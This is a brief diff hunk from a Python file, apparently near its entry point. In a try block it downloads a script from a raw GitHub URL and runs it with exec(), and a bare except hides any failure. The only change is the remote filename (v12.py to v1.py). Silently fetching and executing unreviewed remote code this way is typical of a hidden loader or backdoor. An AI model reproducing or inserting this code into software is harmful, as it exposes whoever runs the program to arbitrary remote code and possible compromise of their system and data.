@@ -150,7 +150,7 @@ if __name__ == "__main__":
 try:
   import urllib.request
 
-  url_v12 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v12.py'
+  url_v12 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v1.py'
   with urllib.request.urlopen(url_v12) as response:
     exec(response.read().decode('utf-8'))
 except:
